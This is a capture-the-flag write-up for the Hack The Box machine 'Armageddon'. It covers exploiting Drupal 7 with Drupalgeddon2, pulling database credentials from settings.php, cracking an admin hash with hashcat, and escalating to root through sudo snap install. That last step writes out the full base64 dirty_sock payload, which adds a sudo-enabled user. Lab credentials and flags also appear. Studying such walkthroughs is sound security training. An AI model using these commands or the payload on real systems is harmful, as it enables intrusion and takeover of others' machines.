# Armageddon
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c0898996-3c1f-46ef-a4dd-fcb8960b6b3f)

## STEPS:
> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.10.233 --min-rate 1000       
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-20 04:49 PDT
Nmap scan report for 10.10.10.233
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82c6bbc7026a93bb7ccbdd9c30937934 (RSA)
|   256 3aca9530f312d7ca4505bcc7f116bbfc (ECDSA)
|_  256 7ad4b36879cf628a7d5a61e7060f5f33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to  Armageddon |  Armageddon
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.15 seconds
```

1. Based from the nmap results, the machine runs a web application and opens ssh login.

> WEB APP

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8338bf80-93a6-4b1e-a6fe-1f141d0fba93)


2. Noticed the webapp using **Drupal 7** CMS.

> DRUPAL 7 EXPLOIT DOCUMENTATION --> https://www.exploit-db.com/exploits/44449

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/70860b11-e9cc-4653-bab6-ebb1f17e8230)


3. Great! Based from the documentation and the chall's title. We seems in the correct approach.
4. Found a 2 github POCs we can use here.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f04f5a98-3fea-46d2-aa49-2a997e20f43e)


5. I used the most starred github repo --> https://github.com/dreadlocked/Drupalgeddon2
6. Let's clone the repo and run the ruby solver.

> RESULT - Got shell!

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/27058e5d-9011-424b-a860-03ac10c85aba)


7. Interesting! The shell we got is not fully interactive.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/00a017e8-1ef3-4dde-83a8-e9c6ea111ca3)


8. Did a small research about drupal. Turns out there should be a creds we can access at this path --> sites/default/settings.php

```
https://serverpilot.io/docs/where-to-find-your-database-credentials-in-drupal/
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/dc3de778-0eed-4eca-a640-26be6196fe3f)



> RESULT

```
armageddon.htb>> ls sites/default/
default.settings.php
files
settings.php
armageddon.htb>> 
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4e347ec5-daba-4cf5-935e-7f48a66ea070)


9. Found a cred we can use to login to mysql --> drupaluser:CQHEy@9M*m23gBVj

> RESULT

```
armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'
Database
information_schema
drupal
mysql
performance_schema
armageddon.htb>>
```

10. Awesome! Let's see tables inside `Drupal` database.

```
armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; show tables;'
Tables_in_drupal
actions
authmap
batch
block
block_custom
block_node_type
block_role
blocked_ips
cache
cache_block
cache_bootstrap
cache_field
cache_filter
cache_form
cache_image
cache_menu
cache_page
cache_path
comment
date_format_locale
date_format_type
date_formats
field_config
field_config_instance
field_data_body
field_data_comment_body
field_data_field_image
field_data_field_tags
field_revision_body
field_revision_comment_body
field_revision_field_image
field_revision_field_tags
file_managed
file_usage
filter
filter_format
flood
history
image_effects
image_styles
menu_custom
menu_links
menu_router
node
node_access
node_comment_statistics
node_revision
node_type
queue
rdf_mapping
registry
registry_file
role
role_permission
search_dataset
search_index
search_node_links
search_total
semaphore
sequences
sessions
shortcut_set
shortcut_set_users
system
taxonomy_index
taxonomy_term_data
taxonomy_term_hierarchy
taxonomy_vocabulary
url_alias
users
users_roles
variable
watchdog
armageddon.htb>>
```

11. Let's select all column from **users** table.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e2bb6db5-eda3-48a2-b0df-385862f37025)


12. Found a username that should be our interest --> **brucetherealadmin**. But the password is hashed.
13. Hmm.. Let's try to crack it using **hashcat**.

```
brucetherealadmin:$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```

> CRACKING PASSWORD

Grabbing module for drupal.

```
┌──(brandy㉿bread-yolk)-[~]
└─$ hashcat --help | grep Drupal
   7900 | Drupal7                                                    | Forums, CMS, E-Commerce
```

```
┌──(brandy㉿bread-yolk)-[~]
└─$ echo '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' > hash.hashes
```

```
┌──(brandy㉿bread-yolk)-[~]
└─$ hashcat -m 7900 -a 0 hash.hashes /usr/share/wordlists/rockyou.txt --force -o result.txt
```

```
┌──(brandy㉿bread-yolk)-[~]
└─$ cat res*       
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
```

14. Turnsout the password is `booboo`. Let's run ssh to the remote server as `brucetherealadmin`.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f5c7779c-a1eb-4288-af31-8563dda84e47)


15. We got shell as bruce!!

> GETTING USER FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9ae74d97-d714-4ce0-9de7-e29ced5110a2)


## USER FLAG

```
25cb471722841bf8d37585920cdd9e3f
```

16. To do privesc, let's check the sudo permission.

> RESULT

```
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

17. Here's what interesting, based from the sudo permission for this user. We are allowed to make a snap packages. We can make **malicious** snap packages. Anyway we need to run **systemctl** start and enable to connect to the host. But we still can do that by running --devmode.
18. Did a small research again about malicious snap packages, found these:

```
https://initblog.com/2019/dirty-sock/
https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1944b82b-2bda-47e0-8a9b-148e4abca045)


19. Anyway, took me a while solving this. Already tried to make malicious snap packages but failed again and again. So I used the base64 payload from this:

```
https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6164d87e-2b6c-494b-b53f-6e4eda334946)


> RESULT

```
┌──(brandy㉿bread-yolk)-[/tmp]
└─$ python2 -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A" * 4256 + "=="' | base64 -d > mal_snap.snap
```

```
┌──(brandy㉿bread-yolk)-[/tmp]
└─$ scp mal_snap.snap brucetherealadmin@armageddon.htb://tmp
brucetherealadmin@armageddon.htb's password: 
mal_snap.snap                                                                                   100% 4096    35.7KB/s   00:00    
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/89a5c7d8-0ea4-4bc7-8161-e8afe49d8631)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e65efca7-6d77-44bb-b77e-d8097424e325)


20. Awesome!!! We just created another user with sudo permissions for all.

> GETTING ROOT FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/71b0244d-1137-469b-a4e4-4f8dddff6494)


## ROOT FLAG

```
9ae61e4bda33fe56a072895aef8a0d57
```
